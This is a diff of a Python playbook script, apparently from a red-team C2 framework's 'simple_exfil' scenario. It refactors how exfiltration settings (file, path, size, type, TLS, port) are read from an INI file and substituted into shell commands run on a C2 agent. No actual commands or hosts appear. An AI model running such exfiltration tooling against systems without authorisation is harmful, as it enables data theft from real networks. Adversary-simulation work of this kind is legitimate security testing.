@@ -51,7 +51,6 @@ pp = pprint.PrettyPrinter(indent=4)
 config = ConfigParser()
 config.read('havoc-playbooks/simple_exfil/simple_exfil.ini')
 
-exfil_outfile = config.get('exfil_task', 'exfil_outfile')
 exfil_type = config.get('exfil_task', 'exfil_type')
 exfil_port = config.get('exfil_task', 'exfil_port')
 exfil_tls = config.get('exfil_task', 'tls')
@@ -60,7 +59,10 @@ exfil_task_domain_name = config.get('exfil_task', 'domain_name')
 exfil_cert_subj = config.get('exfil_task', 'cert_subj')
 c2_task_name = config.get('c2_task', 'task_name')
 c2_agent_name = config.get('c2_task', 'agent_name')
-command_list = config.get('c2_task', 'command_list')
+exfil_file = config.get('exfil_actions', 'exfil_file')
+exfil_file_path = config.get('exfil_actions', 'exfil_file_path')
+exfil_file_size = config.get('exfil_actions', 'exfil_file_size')
+command_list = config.get('exfil_actions', 'command_list')
 
 exfil_task_exists = None
 exfil_portgroup_exists = None
@@ -200,8 +202,10 @@ else:
 # Execute a list of shell commands on the agent.
 for command in command_list.split(', '):
     # Replace variables in shell_command
-    exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, command)
-    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
+    exfil_file_path_insert = re.sub('\$EXFIL_FILE_PATH', exfil_file_path, command)
+    exfil_file_insert = re.sub('\$EXFIL_FILE', exfil_file, exfil_file_path_insert)
+    exfil_file_size_insert = re.sub('\$EXFIL_FILE_SIZE', exfil_file_size, exfil_file_insert)
+    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_file_size_insert)
     if exfil_tls.lower() == 'true':
         exfil_tls_insert = re.sub('\$TLS', 's', exfil_type_insert)
     else:
